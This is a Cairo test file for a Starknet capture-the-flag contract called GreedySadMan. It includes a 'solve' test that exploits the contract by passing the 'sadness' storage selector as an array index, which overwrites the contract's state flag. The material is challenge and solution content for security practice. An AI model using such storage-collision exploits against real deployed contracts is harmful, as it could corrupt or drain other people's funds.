use ctf::greedy_sad_man::{GreedySadMan, IGreedySadManDispatcherTrait, IGreedySadManDispatcher};
use openzeppelin::account::interface::{AccountABIDispatcherTrait, AccountABIDispatcher};
use openzeppelin::presets::Account;
use openzeppelin::tests::account::test_account::{SIGNED_TX_DATA, SignedTransactionData};
use openzeppelin::tests::utils::constants::{PUBKEY, MIN_TRANSACTION_VERSION};
use openzeppelin::tests::utils;
use openzeppelin::utils::serde::SerializedAppend;
use starknet::account::Call;
use starknet::testing;
use starknet::{StorageAddress, storage_address_from_base};

//
// Setup
//

fn setup_dispatcher_with_data(data: Option<@SignedTransactionData>) -> AccountABIDispatcher {
    testing::set_version(MIN_TRANSACTION_VERSION);

    let mut calldata = array![];
    if data.is_some() {
        let data = data.unwrap();
        testing::set_signature(array![*data.r, *data.s].span());
        testing::set_transaction_hash(*data.transaction_hash);

        calldata.append(*data.public_key);
    } else {
        calldata.append(PUBKEY);
    }
    let address = utils::deploy(Account::TEST_CLASS_HASH, calldata);
    AccountABIDispatcher { contract_address: address }
}


fn deploy_greedy_sad_man() -> IGreedySadManDispatcher {
    let mut calldata = array![];
    let address = utils::deploy(GreedySadMan::TEST_CLASS_HASH, calldata);
    IGreedySadManDispatcher { contract_address: address }
}

#[test]
fn test_append_and_check() {
    let account = setup_dispatcher_with_data(Option::Some(@SIGNED_TX_DATA()));
    let gsm = deploy_greedy_sad_man();
    let mut calls = array![];

    // Craft call1
    let mut calldata1 = array![];
    let amount1 = 300;
    calldata1.append_serde(amount1);
    let call1 = Call {
        to: gsm.contract_address, selector: selector!("donate"), calldata: calldata1.span()
    };

    // Craft call2
    let mut calldata2 = array![];
    let amount2 = 500;
    calldata2.append_serde(amount2);
    let call2 = Call {
        to: gsm.contract_address, selector: selector!("donate"), calldata: calldata2.span()
    };

    // Execute
    calls.append(call1);
    calls.append(call2);
    account.__execute__(calls);

    assert!(gsm.get_sadness());
    assert_eq!(gsm.get_donation_by_index(1), amount1);
    assert_eq!(gsm.get_donation_by_index(2), amount2);
}

#[test]
fn solve() {
    let account = setup_dispatcher_with_data(Option::Some(@SIGNED_TX_DATA()));
    let gsm = deploy_greedy_sad_man();
    let mut calls = array![];

    // Craft call1
    let mut calldata1 = array![];

    let index: felt252 = selector!("sadness");
    calldata1.append_serde(index);
    let call1 = Call {
        to: gsm.contract_address,
        selector: selector!("get_donation_by_index"),
        calldata: calldata1.span()
    };

    // Execute
    calls.append(call1);
    account.__execute__(calls);

    assert_eq!(gsm.get_sadness(), false);
}
